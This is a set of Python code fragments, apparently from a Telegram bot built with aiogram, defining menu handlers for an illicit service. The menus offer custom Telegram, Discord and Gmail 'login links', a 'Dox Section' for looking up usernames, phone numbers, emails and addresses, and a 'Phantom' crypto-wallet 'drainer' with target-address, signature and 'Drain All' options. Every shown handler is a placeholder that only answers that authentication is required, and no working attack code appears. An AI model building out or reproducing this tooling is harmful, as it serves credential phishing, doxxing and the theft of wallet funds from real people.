...
async def socialmediabot_section(callback: types.CallbackQuery):
    ...
    socialmediabot_keyboard.add(types.InlineKeyboardButton("Telegram -> Members", callback_data="authentication_key_required"))  # Fixed typo
...
async def bundler_menu(callback: types.CallbackQuery):
    ...
    bundler_keyboard.add(types.InlineKeyboardButton("🔙 Back to Main Bot Menu", callback_data="bot_menu"))
...
# Corresponding handlers for each button in the Special Links menu
@dp.callback_query_handler(lambda c: c.data == 'telegram_login')
async def telegram_login(callback: types.CallbackQuery):
    """Handles Telegram login link requests."""
    await callback.message.edit_text(
        "*Telegram Login Link:*\n\n"
        "Your custom Telegram login link: `authentication key required`",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔙 Back to Special Links", callback_data="special_links")
        )
    )
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == 'discord_login')
async def discord_login(callback: types.CallbackQuery):
    """Handles Discord login link requests."""
    await callback.message.edit_text(
        "*Discord Login Link:*\n\n"
        "Your custom Discord login link: `authentication key required`",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔙 Back to Special Links", callback_data="special_links")
        )
    )
...
@dp.callback_query_handler(lambda c: c.data == 'gmail_login')
async def gmail_login(callback: types.CallbackQuery):
    """Handles Gmail login link requests."""
    await callback.message.edit_text(
        "*Gmail Login Link:*\n\n"
        "Your custom Gmail login link: `authentication key required`",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔙 Back to Special Links", callback_data="special_links")
        )
    )
...
# Add missing callback handlers for Dox Section
@dp.callback_query_handler(lambda c: c.data == 'web_scrape')
async def web_scrape(callback: types.CallbackQuery):
    """Handles web scraping requests."""
    await callback.message.edit_text(
        "🔍 *Web Scrape:* Feature requires authentication.",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔙 Back to Dox Section", callback_data="dox_section")
        )
    )
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == 'usernames')
async def usernames(callback: types.CallbackQuery):
    """Handles username lookup requests."""
    await callback.message.edit_text(
        "🔍 *Usernames:* Feature requires authentication.",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔙 Back to Dox Section", callback_data="dox_section")
        )
    )
...
@dp.callback_query_handler(lambda c: c.data == 'phone_numbers')
async def phone_numbers(callback: types.CallbackQuery):
    """Handles phone number lookup requests."""
    await callback.message.edit_text(
        "🔍 *Phone Numbers:* Feature requires authentication.",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔙 Back to Dox Section", callback_data="dox_section")
        )
    )
...
@dp.callback_query_handler(lambda c: c.data == 'emails')
async def emails(callback: types.CallbackQuery):
    """Handles email lookup requests."""
    await callback.message.edit_text(
        "🔍 *Emails:* Feature requires authentication.",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔙 Back to Dox Section", callback_data="dox_section")
        )
    )
...
@dp.callback_query_handler(lambda c: c.data == 'addresses')
async def addresses(callback: types.CallbackQuery):
    """Handles address lookup requests."""
    await callback.message.edit_text(
        "🔍 *Addresses:* Feature requires authentication.",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔙 Back to Dox Section", callback_data="dox_section")
        )
    )
...
# Add missing callback handlers for Phantom Menu
@dp.callback_query_handler(lambda c: c.data == 'how_to_use_drainer')
async def how_to_use_drainer(callback: types.CallbackQuery):
    """Handles 'How to Use Drainer' requests."""
    await callback.message.edit_text(
        "💡 *How to Use Drainer:* Feature requires authentication.",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔙 Back to Phantom Menu", callback_data="phantom_menu")
        )
    )
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == 'input_wallet_address')
async def input_wallet_address(callback: types.CallbackQuery):
    """Handles wallet address input."""
    await callback.message.edit_text(
        "💳 *Input Wallet Address:* Feature requires authentication.",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔙 Back to Phantom Menu", callback_data="phantom_menu")
        )
    )
...
@dp.callback_query_handler(lambda c: c.data == 'target_address')
async def target_address(callback: types.CallbackQuery):
    """Handles target address input."""
    await callback.message.edit_text(
        "🎯 *Target Address:* Feature requires authentication.",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔙 Back to Phantom Menu", callback_data="phantom_menu")
        )
    )
...
@dp.callback_query_handler(lambda c: c.data == 'input_signature')
async def input_signature(callback: types.CallbackQuery):
    """Handles signature input."""
    await callback.message.edit_text(
        "✍️ *Input Signature:* Feature requires authentication.",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔙 Back to Phantom Menu", callback_data="phantom_menu")
        )
    )
...
@dp.callback_query_handler(lambda c: c.data == 'drain_all')
async def drain_all(callback: types.CallbackQuery):
    """Handles 'Drain All' requests."""
    await callback.message.edit_text(
        "💸 *Drain All:* Feature requires authentication.",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔙 Back to Phantom Menu", callback_data="phantom_menu")
        )
    )
...
# Add missing callback handlers for How To Section
@dp.callback_query_handler(lambda c: c.data == 'bot_guide')
async def bot_guide(callback: types.CallbackQuery):
    """Handles 'Bot Guide and Function' requests."""
    await callback.message.edit_text(
        "📖 *Bot Guide and Function:* Feature requires authentication.",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🔙 Back to How To Section", callback_data="how_to")
        )
    )
    await callback.answer()
